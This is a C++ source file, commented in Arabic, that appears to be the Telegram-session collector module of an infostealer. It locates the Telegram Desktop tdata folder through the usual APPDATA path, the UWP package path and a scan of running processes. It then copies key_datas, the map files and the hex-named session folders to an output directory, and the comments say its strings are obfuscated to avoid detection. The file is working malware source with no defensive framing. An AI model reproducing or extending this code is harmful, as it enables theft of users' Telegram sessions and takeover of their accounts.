// telegram_collector.cpp – نسخة معتمدة كلياً على GetObfuscatedString
#include "telegram_collector.h"
#include "../crypto/obfuscation.h"
#include <windows.h>
#include <shlobj.h>
#include <tlhelp32.h>
#include <string>
#include <vector>
#include <cctype>

// دوال مساعدة (لا تحتوي على نصوص حساسة)
static bool IsHexFolder(const std::string& name) {
    if (name.size() != 16) return false;
    for (char c : name) {
        if (!isxdigit(static_cast<unsigned char>(c))) return false;
    }
    return true;
}

static void CreateDirRecursive(const std::string& path) {
    char tmp[MAX_PATH];
    snprintf(tmp, sizeof(tmp), "%s", path.c_str());
    for (char* p = tmp + 1; *p; p++) {
        if (*p == '\\' || *p == '/') {
            *p = 0;
            CreateDirectoryA(tmp, NULL);
            *p = '\\';
        }
    }
    CreateDirectoryA(tmp, NULL);
}

static bool CopySingleFile(const std::string& src, const std::string& dst) {
    return CopyFileA(src.c_str(), dst.c_str(), FALSE) != 0;
}

// نسخ الملفات التي تطابق نمطاً معيناً في المجلد (filter إما "key_datas" أو "map")
static void CopyFilteredFiles(const std::string& srcDir, const std::string& dstDir, int filterID) {
    std::string filter = GetObfuscatedString(filterID);  // إما "key_datas" أو "map"
    std::string search = srcDir + "\\*";
    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(search.c_str(), &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;
    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            std::string fname = fd.cFileName;
            if (filter == "key_datas" && fname == "key_datas") {
                std::string srcFile = srcDir + "\\" + fname;
                std::string dstFile = dstDir + "\\" + fname;
                CopySingleFile(srcFile, dstFile);
            }
            else if (filter == "map" && fname.find("map") == 0) {
                std::string srcFile = srcDir + "\\" + fname;
                std::string dstFile = dstDir + "\\" + fname;
                CopySingleFile(srcFile, dstFile);
            }
        }
    } while (FindNextFileA(hFind, &fd));
    FindClose(hFind);
}

// نسخ مجلد جلسة كامل (المجلدات السداسية)
static void CopySessionFolder(const std::string& srcSession, const std::string& dstSession) {
    CreateDirRecursive(dstSession);
    std::string search = srcSession + "\\*";
    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(search.c_str(), &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;
    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            std::string srcFile = srcSession + "\\" + fd.cFileName;
            std::string dstFile = dstSession + "\\" + fd.cFileName;
            CopySingleFile(srcFile, dstFile);
        }
    } while (FindNextFileA(hFind, &fd));
    FindClose(hFind);
}

std::string FindTelegramTdata() {
    std::vector<std::string> paths;
    std::string tdataFolder = GetObfuscatedString(STR_TDATA);
    std::string telegramDesktop = GetObfuscatedString(STR_TELEGRAM_DESKTOP);
    
    // المسار العادي %APPDATA%
    char appdata[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata))) {
        paths.push_back(std::string(appdata) + "\\" + telegramDesktop + "\\" + tdataFolder);
    }
    
    // مسار UWP
    char localappdata[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localappdata))) {
        paths.push_back(std::string(localappdata) + "\\Packages\\Telegram.TelegramDesktop_t1g15s55y1sr8\\LocalCache\\Roaming\\" + telegramDesktop + "\\" + tdataFolder);
    }
    
    // البحث عن عملية Telegram
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, &pe)) {
            do {
                if (_stricmp(pe.szExeFile, "Telegram.exe") == 0) {
                    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe.th32ProcessID);
                    if (hProcess) {
                        char path[MAX_PATH];
                        DWORD size = MAX_PATH;
                        if (QueryFullProcessImageNameA(hProcess, 0, path, &size)) {
                            std::string exePath(path);
                            size_t pos = exePath.find_last_of("\\");
                            if (pos != std::string::npos) {
                                std::string exeDir = exePath.substr(0, pos);
                                std::string tdataCandidate = exeDir + "\\" + tdataFolder;
                                DWORD attrs = GetFileAttributesA(tdataCandidate.c_str());
                                if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
                                    paths.push_back(tdataCandidate);
                                }
                            }
                        }
                        CloseHandle(hProcess);
                    }
                }
            } while (Process32Next(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }
    
    for (const auto& p : paths) {
        DWORD attrs = GetFileAttributesA(p.c_str());
        if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
            return p;
        }
    }
    return "";
}

bool CopyTelegramSession(const std::string& tdataPath, const std::string& outputDir) {
    DWORD attrs = GetFileAttributesA(tdataPath.c_str());
    if (attrs == INVALID_FILE_ATTRIBUTES || !(attrs & FILE_ATTRIBUTE_DIRECTORY)) return false;
    
    std::string outTdata = outputDir + "\\" + GetObfuscatedString(STR_TDATA);
    CreateDirRecursive(outTdata);
    
    // نسخ key_datas و map*
    CopyFilteredFiles(tdataPath, outTdata, STR_KEY_DATAS);
    CopyFilteredFiles(tdataPath, outTdata, STR_MAP_PREFIX);
    
    // نسخ المجلدات السداسية (الجلسات)
    std::string search = tdataPath + "\\*";
    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(search.c_str(), &fd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                std::string dirName = fd.cFileName;
                if (IsHexFolder(dirName)) {
                    std::string srcSession = tdataPath + "\\" + dirName;
                    std::string dstSession = outTdata + "\\" + dirName;
                    CopySessionFolder(srcSession, dstSession);
                }
            }
        } while (FindNextFileA(hFind, &fd));
        FindClose(hFind);
    }
    return true;
}